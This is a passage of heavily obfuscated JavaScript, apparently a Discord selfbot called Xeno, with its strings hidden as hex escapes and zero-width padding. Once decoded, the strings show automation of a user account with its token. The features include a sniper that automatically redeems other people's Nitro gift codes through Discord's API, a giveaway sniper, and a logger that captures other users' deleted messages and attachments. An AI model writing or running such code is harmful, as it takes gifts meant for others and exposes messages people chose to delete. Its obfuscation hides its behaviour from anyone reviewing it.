x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x3C\x40\x21","\x65\x76\x65\x72\x79\x6F\x6E\x65","\x3C\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D\x3E\x20\u200B\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\u200B\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x7C\x40\x65\x76\x65\x72\x79\x6F\x6E\x65","\x38\x62\x61\x6C\x6C","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x61\x20\x71\x75\x65\x73\x74\x69\x6F\x6E\x20\x74\x6F\x20\x61\x73\x6B\x20\x74\x68\x65\x20\x38\x62\x61\x6C\x6C\x2E","\x41\x73\x20\x49\x20\x73\x65\x65\x20\x69\x74\x2C\x20\x79\x65\x73\x2E","\x41\x73\x6B\x20\x61\x67\x61\x69\x6E\x20\x6C\x61\x74\x65\x72\x2E","\x42\x65\x74\x74\x65\x72\x20\x6E\x6F\x74\x20\x74\x65\x6C\x6C\x20\x79\x6F\x75\x20\x6E\x6F\x77\x2E","\x43\x61\x6E\x6E\x6F\x74\x20\x70\x72\x65\x64\x69\x63\x74\x20\x6E\x6F\x77\x2E","\x43\x6F\x6E\x63\x65\x6E\x74\x72\x61\x74\x65\x20\x61\x6E\x64\x20\x61\x73\x6B\x20\x61\x67\x61\x69\x6E\x2E","\x44\x6F\x6E\u2019\x74\x20\x63\x6F\x75\x6E\x74\x20\x6F\x6E\x20\x69\x74\x2E","\x49\x74\x20\x69\x73\x20\x63\x65\x72\x74\x61\x69\x6E\x2E","\x49\x74\x20\x69\x73\x20\x64\x65\x63\x69\x64\x65\x64\x6C\x79\x20\x73\x6F\x2E","\x4D\x6F\x73\x74\x20\x6C\x69\x6B\x65\x6C\x79\x2E","\x4D\x79\x20\x72\x65\x70\x6C\x79\x20\x69\x73\x20\x6E\x6F\x2E","\x4D\x79\x20\x73\x6F\x75\x72\x63\x65\x73\x20\x73\x61\x79\x20\x6E\x6F\x2E","\x4F\x75\x74\x6C\x6F\x6F\x6B\x20\x6E\x6F\x74\x20\x73\x6F\x20\x67\x6F\x6F\x64\x2E","\x4F\x75\x74\x6C\x6F\x6F\x6B\x20\x67\x6F\x6F\x64\x2E","\x52\x65\x70\x6C\x79\x20\x68\x61\x7A\x79\x2C\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6E\x2E","\x53\x69\x67\x6E\x73\x20\x70\x6F\x69\x6E\x74\x20\x74\x6F\x20\x79\x65\x73\x2E","\x56\x65\x72\x79\x20\x64\x6F\x75\x62\x74\x66\x75\x6C\x2E","\x57\x69\x74\x68\x6F\x75\x74\x20\x61\x20\x64\x6F\x75\x62\x74\x2E","\x59\x65\x73\x2E","\x59\x65\x73\x20\u2013\x20\x64\x65\x66\x69\x6E\x69\x74\x65\x6C\x79\x2E","\x59\x6F\x75\x20\x6D\x61\x79\x20\x72\x65\x6C\x79\x20\x6F\x6E\x20\x69\x74\x2E","\x52\x65\x73\x70\x6F\x6E\x73\x65\x3A","\x51\x75\x65\x73\x74\x69\x6F\x6E\x3A","\x54\x68\x65\x20\x4D\x61\x67\x69\x63\x20\x38\x20\x42\x61\x6C\x6C\x20\x68\x61\x73\x20\x73\x70\x6F\x6B\x65\x6E","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x54\x68\x65\x20\x4D\x61\x67\x69\x63\x20\x38\x20\x42\x61\x6C\x6C\x20\x68\x61\x73\x20\x73\x70\x6F\x6B\x65\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x51\x75\x65\x73\x74\x69\x6F\x6E\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x52\x65\x73\x70\x6F\x6E\x73\x65\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5C\x60\x5C\x60\x5C\x60","\x62\x6F\x74\x69\x6E\x66\x6F","\x50\x61\x73\x74\x20\x4E\x61\x6D\x65\x73","\x43\x72\x79\x70\x74\x69\x63\x2C\x20\x44\x69\x61\x6D\x6F\x6E\x64","\x42\x6F\x74\x20\x56\x65\x72\x73\x69\x6F\x6E","\x2E\x2F\x70\x61\x63\x6B\x61\x67\x65\x2E\x6A\x73\x6F\x6E","\x44\x69\x73\x63\x6F\x72\x64\x2E\x6A\x73\x20\x56\x65\x72\x73\x69\x6F\x6E","\x4E\x6F\x64\x65\x2E\x6A\x73\x20\x56\x65\x72\x73\x69\x6F\x6E","\x44\x65\x76\x65\x6C\x6F\x70\x65\x72","\x58\x65\x6E\x6F\x20\x69\x73\x20\x61\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x75\x73\x65\x72\x20\x61\x75\x74\x6F\x6D\x61\x74\x69\x6F\x6E\x20\x74\x6F\x6F\x6C","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x58\x65\x6E\x6F\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x58\x65\x6E\x6F\x20\x69\x73\x20\x61\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x75\x73\x65\x72\x20\x61\x75\x74\x6F\x6D\x61\x74\x69\x6F\x6E\x20\x74\x6F\x6F\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x44\x65\x76\x65\x6C\x6F\x70\x65\x72\x3A\x20\x58\x65\x6E\x6F\x23\x30\x35\x33\x38\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4E\x6F\x64\x65\x2E\x6A\x73\x20\x56\x65\x72\x73\x69\x6F\x6E\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x44\x69\x73\x63\x6F\x72\x64\x2E\x6A\x73\x20\x56\x65\x72\x73\x69\x6F\x6E\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x42\x6F\x74\x20\x56\x65\x72\x73\x69\x6F\x6E\x3A\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x50\x61\x73\x74\x20\x4E\x61\x6D\x65\x73\x3A\x20\x43\x72\x79\x70\x74\x69\x63\x2C\x20\x44\x69\x61\x6D\x6F\x6E\x64\x5C\x6E\x5C\x6E\uD835\uDE53\uD835\uDE5A\uD835\uDE63\uD835\uDE64\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5C\x60\x5C\x60\x5C\x60","\x62\x69\x6E\x61\x72\x79","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x70\x61\x64\x53\x74\x61\x72\x74","\x70\x61\x72\x73\x65\x49\x6E\x74","\x73\x74\x72\x65\x61\x6D","\x53\x54\x52\x45\x41\x4D\x49\x4E\x47","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x74\x77\x69\x74\x63\x68\x2E\x74\x76\x2F\x63\x72\x79\x70\x74\x69\x63","\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x5C\x60\x53\x54\x52\x45\x41\x4D\x49\x4E\x47\x5C\x60\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x5C\x60","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x75\x63\x63\x65\x73\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x53\x54\x52\x45\x41\x4D\x49\x4E\x47\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20","\x77\x61\x74\x63\x68\x69\x6E\x67","\x57\x41\x54\x43\x48\x49\x4E\x47","\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x5C\x60\x57\x41\x54\x43\x48\x49\x4E\x47\x5C\x60\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x5C\x60","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x75\x63\x63\x65\x73\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x57\x41\x54\x43\x48\x49\x4E\x47\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20","\x6C\x69\x73\x74\x65\x6E\x69\x6E\x67","\x4C\x49\x53\x54\x45\x4E\x49\x4E\x47","\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x5C\x60\x4C\x49\x53\x54\x45\x4E\x49\x4E\x47\x5C\x60\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x5C\x60","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x75\x63\x63\x65\x73\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x53\x54\x52\x45\x41\x4D\x49\x4E\x47\x20\x77\x69\x74\x68\x20\x4C\x49\x53\x54\x45\x4E\x49\x4E\x47\x20","\x70\x6C\x61\x79\x69\x6E\x67","\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x5C\x60\x50\x4C\x41\x59\x49\x4E\x47\x5C\x60\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x5C\x60","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x75\x63\x63\x65\x73\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x73\x65\x74\x20\x74\x6F\x20\x50\x4C\x41\x59\x49\x4E\x47\x20\x77\x69\x74\x68\x20\x6D\x65\x73\x73\x61\x67\x65\x20","\x72\x65\x73\x65\x74","\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x72\x65\x73\x65\x74","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x53\x75\x63\x63\x65\x73\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x59\x6F\x75\x72\x20\x61\x63\x74\x69\x76\x69\x74\x79\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x72\x65\x73\x65\x74","\u200B\x0A","\x72\x65\x76\x65\x72\x73\x65","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x73\x6F\x6D\x65\x20\x74\x65\x78\x74\x2E","\x61\x73\x63\x69\x69","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x73\x6F\x6D\x65\x20\x74\x65\x78\x74\x21","\x55\x68\x20\x4F\x68\x2C\x20\x61\x6E\x20\x65\x72\x72\x6F\x72\x20\x68\x61\x73\x20\x6F\x63\x63\x75\x72\x72\x65\x64\x2E\x20\x45\x72\x72\x6F\x72\x20","\x50\x6C\x65\x61\x73\x65\x20\x70\x72\x6F\x76\x69\x64\x65\x20\x74\x65\x78\x74\x20\x73\x68\x6F\x72\x74\x65\x72\x20\x74\x68\x61\x74\x20\x32\x30\x30\x30\x20\x63\x68\x61\x72\x61\x63\x74\x65\x72\x73\x2E","\x72\x65\x70\x6C\x79","\x60\x60\x60","\x6D\x65\x73\x73\x61\x67\x65\x44\x65\x6C\x65\x74\x65","\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73","\x70\x72\x6F\x78\x79\x55\x52\x4C","\x65\x6E\x2D\x47\x42","\x66\x75\x6C\x6C","\x73\x68\x6F\x72\x74","\x75\x6E\x73\x68\x69\x66\x74","\x73\x65\x74","\x64\x6D","\x2D\x20\x43\x48\x41\x4E\x4E\x45\x4C\x3A\x20","\x2D\x20\x53\x45\x52\x56\x45\x52\x3A\x20","\x2D\x20\x41\x55\x54\x48\x4F\x52\x3A\x20","\x2D\x20\x45\x4C\x41\x50\x53\x45\x44\x3A\x20","\x73\x20","\x2D\x20\x43\x4F\x44\x45\x3A\x20","\x47\x49\x56\x45\x41\x57\x41\x59","\x32\x39\x34\x38\x38\x32\x35\x38\x34\x32\x30\x31\x30\x30\x33\x30\x30\x39","\uD83C\uDF89","\x20\x2D\x20\x47\x69\x76\x65\x61\x77\x61\x79\x20\x53\x6E\x69\x70\x65\x64\x5D","\x20\x2D\x20\x47\x69\x76\x65\x61\x77\x61\x79\x20\x43\x6F\x75\x6C\x64\x6E\x27\x74\x20\x52\x65\x61\x63\x74\x5D","\x43\x6F\x6E\x67\x72\x61\x74\x75\x6C\x61\x74\x69\x6F\x6E\x73\x20\x3C\x40","\x64\x69\x73\x63\x6F\x72\x64\x2E\x67\x69\x66\x74","\x65\x78\x65\x63","\x20\x2D\x20\x55\x6E\x6B\x6E\x6F\x77\x6E\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x20\x77\x61\x73\x20\x65\x69\x74\x68\x65\x72\x20\x72\x65\x64\x65\x65\x6D\x65\x64\x20\x6F\x72\x20\x69\x6E\x76\x61\x6C\x69\x64\x2F\x66\x61\x6B\x65\x5D","\x20\x2D\x20\x56\x61\x6C\x69\x64\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x72\x65\x64\x65\x65\x6D\x65\x64\x5D","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x76\x36\x2F\x65\x6E\x74\x69\x74\x6C\x65\x6D\x65\x6E\x74\x73\x2F\x67\x69\x66\x74\x2D\x63\x6F\x64\x65\x73\x2F","\x2F\x72\x65\x64\x65\x65\x6D","\x74\x6F\x6B\x65\x6E\x2D\x68\x65\x72\x65","\x59\x6F\x75\x20\x64\x69\x64\x6E\x27\x74\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x74\x6F\x6B\x65\x6E\x20\x69\x6E\x20\x63\x6F\x6E\x66\x69\x67\x2E\x6A\x73\x6F\x6E","\x49\x6E\x76\x61\x6C\x69\x64\x20\x54\x6F\x6B\x65\x6E","\x6C\x6F\x67\x69\x6E"];const Discord=require(_0xa42d[0]);const config=require(_0xa42d[1]);const bot= new Discord.Client();const {color,image,footer,enabled}=config[_0xa42d[2]];const moment=require(_0xa42d[3]);const colors=require(_0xa42d[4]);const axios=require(_0xa42d[6])[_0xa42d[5]];const title=require(_0xa42d[7]);const fetch=require(_0xa42d[8]);const figlet=require(_0xa42d[9]);const superagent=require(_0xa42d[10]);const {post}=require(_0xa42d[11]);const {stripIndents}=require(_0xa42d[12]);const {Type}=require(_0xa42d[13]);const {inspect}=require(_0xa42d[14]);const fs=require(_0xa42d[15]);const webhook=require(_0xa42d[16]);require(_0xa42d[17])(bot);bot[_0xa42d[18]]= (_0x74d2xd)=>{console[_0xa42d[18]](_0x74d2xd)};bot[_0xa42d[19]]= (_0x74d2xe)=>{console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2xe)}${_0xa42d[20]}`)};bot[_0xa42d[25]]= (_0x74d2xf)=>{console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2xf)}${_0xa42d[20]}`)};const selfbot={version:_0xa42d[36],name:_0xa42d[37],linecount:2425};process[_0xa42d[40]](_0xa42d[38],(_0x74d2xe)=>{return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2xe[_0xa42d[39]])}${_0xa42d[20]}`)});process[_0xa42d[40]](_0xa42d[41],(_0x74d2xe)=>{return 